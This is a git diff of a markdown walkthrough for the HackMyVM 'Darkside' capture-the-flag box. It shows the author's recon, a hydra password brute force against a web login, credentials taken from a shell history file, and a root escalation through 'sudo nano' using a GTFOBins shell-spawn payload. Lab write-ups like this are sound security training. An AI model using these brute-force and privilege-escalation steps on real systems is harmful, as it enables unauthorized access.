@@ -2,18 +2,17 @@
 | -------- | ---------- | ----- | ------------- | ---------------------------------------------------- |
 | Darkside | Easy       | Linux | 192.168.0.202 | https://hackmyvm.eu/machines/machine.php?vm=Darkside |
 
-
 ### ARP Scan
 
 ```bash
-gareth@gareth:~/hackmyvm/darkside$ sudo arp-scan -l | grep 8e           
+garffff@garffff:~/hackmyvm/darkside$ sudo arp-scan -l | grep 8e           
 192.168.0.181	08:00:27:8f:5b:8e	PCS Systemtechnik GmbH
 ```
 
 ### Nmap Scan Results
 
 ```bash
-gareth@gareth:~/hackmyvm/darkside$ sudo nmap -p- -sV -sC 192.168.0.181 -oA nmap/darkside.tcp
+garffff@garffff:~/hackmyvm/darkside$ sudo nmap -p- -sV -sC 192.168.0.181 -oA nmap/darkside.tcp
 Starting Nmap 7.80 ( https://nmap.org ) at 2024-10-30 16:34 GMT
 Nmap scan report for 192.168.0.181
 Host is up (0.000088s latency).
@@ -40,7 +39,7 @@ Nmap done: 1 IP address (1 host up) scanned in 7.41 seconds
 Directory bruteforce, we see a file called `vote.txt`:
 
 ```bash
-gareth@gareth:~/hackmyvm/darkside$ feroxbuster -u http://192.168.0.181 -w /opt/SecLists/Discovery/Web-Content/big.txt 
+garffff@garffff:~/hackmyvm/darkside$ feroxbuster -u http://192.168.0.181 -w /opt/SecLists/Discovery/Web-Content/big.txt 
 
  ___  ___  __   __     __      __         __   ___
 |__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
@@ -68,7 +67,7 @@ by Ben "epi" Risher 🤓                 ver: 2.10.0
 200      GET       29l       45w      683c http://192.168.0.181/
 [####################] - 10s    20480/20480   0s      found:4       errors:23     
 [####################] - 9s     20477/20477   2217/s  http://192.168.0.181/ 
-[####################] - 0s     20477/20477   6825667/s http://192.168.0.181/backup/ => Directory listing                                                                                                                                     gareth@gareth:~/hackmyvm/darkside$ curl http://192.168.0.181/backup/vote.txt
+[####################] - 0s     20477/20477   6825667/s http://192.168.0.181/backup/ => Directory listing                                                                                                                                     garffff@garffff:~/hackmyvm/darkside$ curl http://192.168.0.181/backup/vote.txt
 rijaba: Yes
 xerosec: Yes
 sml: No
@@ -81,9 +80,10 @@ d3b0o: Yes
 Since the result was a draw, we will let you enter the darkside, or at least temporarily, good luck kevin.
 ```
 
+Bruteforcing using the password for the kevin user, we get a match:
 
 ```bash
-gareth@gareth:~/hackmyvm/darkside$ hydra -l kevin -P /opt/rockyou.txt 192.168.0.181 http-post-form "/index.php:user=^USER^&pass=^PASS^:Username or password invalid" -VV -F -I
+garffff@garffff:~/hackmyvm/darkside$ hydra -l kevin -P /opt/rockyou.txt 192.168.0.181 http-post-form "/index.php:user=^USER^&pass=^PASS^:Username or password invalid" -VV -F -I
 Hydra v9.2 (c) 2021 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
 
 Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-10-30 17:04:00
@@ -134,24 +134,35 @@ kevin:iloveyou
 ```
 
 
-Logging in:
+Logging in, we are presented with this string::
 
 ![[Pasted image 20241030170623.png]]
 
+Converting from base58 and from from base64:
+
 ```bash
-gareth@gareth:~/hackmyvm/darkside$ echo 'kgr6F1pR4VLAZoFnvRSX1t4GAEqbbph6yYs3ZJw1tXjxZyWCC' | base58 -d
+garffff@garffff:~/hackmyvm/darkside$ echo 'kgr6F1pR4VLAZoFnvRSX1t4GAEqbbph6yYs3ZJw1tXjxZyWCC' | base58 -d
 c2ZxZWttZ25jdXRqaGJ5cHZ4ZGEub25pb24=
-gareth@gareth:~/hackmyvm/darkside$ echo 'c2ZxZWttZ25jdXRqaGJ5cHZ4ZGEub25pb24=' | base64 -d
+garffff@garffff:~/hackmyvm/darkside$ echo 'c2ZxZWttZ25jdXRqaGJ5cHZ4ZGEub25pb24=' | base64 -d
 sfqekmgncutjhbypvxda.onion
 ```
 
+Adding `sfqekmgncutjhbypvxda.onion` to the address:
+
 ![[Pasted image 20241030171011.png]]
+
+Looking at the source code, we can either add `darkside` for both the cookie values or navigate straight to the `hwvhysntovtanj.password` page:
+
 ![[Pasted image 20241030171407.png]]
+
+Navigating to the `hwvhysntovtanj.password` page, we see a set of credentials:
 
 ![[Pasted image 20241030171322.png]]
 
+These can be used to log into the box via SSH, and we can grab the firs flag:
+
 ```bash
-gareth@gareth:~/hackmyvm/darkside$ ssh kevin@192.168.0.181
+garffff@garffff:~/hackmyvm/darkside$ ssh kevin@192.168.0.181
 kevin@192.168.0.181's password: 
 Linux darkside 5.10.0-26-amd64 #1 SMP Debian 5.10.197-1 (2023-09-29) x86_64
 
@@ -177,6 +188,8 @@ kevin@darkside:~$ cat user.txt
 UnbelievableHumble
 ```
 
+Looking at the `.history` file, we see a set of new credentails:
+
 ```bash
 kevin@darkside:~$ cat .history 
 ls -al
@@ -187,8 +200,9 @@ ps -faux
 su rijaba
 ILoveJabita
 ls /home/rijaba
-
 ```
+
+And it is possible to log into the new user `rijaba`:
 
 ```bash
 kevin@darkside:~$ su rijaba
@@ -198,6 +212,7 @@ rijaba
 uid=1001(rijaba) gid=1001(rijaba) groups=1001(rijaba)
 ```
 
+Looking at what commands we can execute as root, we see nano:
 
 ```bash
 rijaba@darkside:/home/kevin$ sudo -l
@@ -208,7 +223,7 @@ User rijaba may run the following commands on darkside:
     (root) NOPASSWD: /usr/bin/nano
 ```
 
-GTFO bins: https://gtfobins.github.io/gtfobins/nano/#sudo
+GTFO bins: https://gtfobins.github.io/gtfobins/nano/#sudo provides the privlege escalation technique:
 
 ```bash
 rijaba@darkside:/home/kevin$ sudo nano
@@ -216,7 +231,7 @@ rijaba@darkside:/home/kevin$ sudo nano
 reset; sh 1>&0 2>&0
 ```
 
-```
+Now we have access to root and can read the root flag:
 
 ```bash
                                                                                                                [ Executing... ]# 
